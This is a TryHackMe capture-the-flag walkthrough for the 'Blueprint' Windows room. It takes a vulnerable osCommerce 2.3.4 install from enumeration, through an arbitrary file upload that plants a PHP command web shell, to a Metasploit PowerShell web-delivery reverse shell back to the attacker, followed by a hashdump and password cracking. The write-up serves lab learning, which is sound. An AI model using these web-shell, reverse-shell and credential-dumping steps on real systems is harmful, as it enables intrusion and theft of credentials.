# TryHackMe Blueprint
**Hack into this Windows machine and escalate your privileges to Administrator.**

## Task-1 Blueprint

* During enumeration found - 135,139,443,445,3306,8080 ports open. Tried 'anonymous' login on smb but was unseccessful. Only active ports were - 443,8080. On '8080' found a directory named 'oscommerce' and then a sub-directory 'catalog'. Then a poorly developed web-page was opened which was redirecting to nowhere. 

* After this I ran gobuster on above site and got a page 'install'. In that was a database server which required some information to proceed. So I gave them these valued - 'Database Server':'localhost', 'username':'root', 'password':'', 'Database Name':'oscommerce'. 

* Then after clicking on continue you will see a web server page. Also you will see 'step=2' changing in the url. Web server page is already filled and now click continue. Then a page named 'Online Store settings' will come. In that enter details accordingly but set 'Administrator username':'admin' and 'Administrator Password':'admin' and then click on continue.

* After that we are successfully registered in the database. Now open your terminal and type 'searchsploit oscommerce 2.3.4'. You will see many exploits but one in particular 'arbitrary file upload'. Now open this python file and run it. You will see it's usage is given.

* Now it takes a .php file which contains our malicious code. Make a php file and in that write "<?php<br>	passthru($_ GET['cmd'])<br>?>". Now run the command (*python exploit.py -u http://IP:8080/oscommerce-2.3.4 --auth=admin:admin -f shell.php*) . After that you will see your authentication successful. In the last line a link will be given. Click that and it will redirect you to page having php warnings.

* Now open msfconsole and in that type (*use exploit/multi/script/web_delivery*). Now type (*show options*) and fill in the required fields. Set your 'SRVHOST' and 'LHOST' same as your 'tun0' ip. Now type 'show targets'. You will see a list of targets. From that select PSH. See the 'Id' of 'PSH' and then type 'set target id_of_PSH'. Now type 'set payload windows/meterpreter/reverse_tcp'. See your options one more time and then click continue. After running you will see something like 'Run the following command on the target machine:' on the metasploit console. Copy the whole command starting from 'powershell.exe' and then go to the website which we got from above result.

* Then type ?cmd='the_whole_command_copied_from_above'. So now your url will look like this - 'http://ip:8080/oscommerce-2.3.4/catalog/admin/shell.php?cmd=the_whole_command_copied_from_above'. Now wait for some time and check your metasploit shell.

* After successfully making the connection type (*sessions -i 1*) and then type 'getuid'. You will see 'Server username: NT AUTHORITY\SYSTEM'. We have successfully gained administrator. Now type 'hashdump' and you will see hashes of various users in the machine. Now answer below questions.

1. "Lab" user NTML hash decrypted<br>
Answer : google**** ('use crackstation to crack password')

* Type 'shell' in the metasploit console and you will see a windows cmd like shell. Now traverse to Administrator's desktop and get the root flag.

2. root.txt
Answer : THM{aea1e3ce6fe7f89e10cea***********}
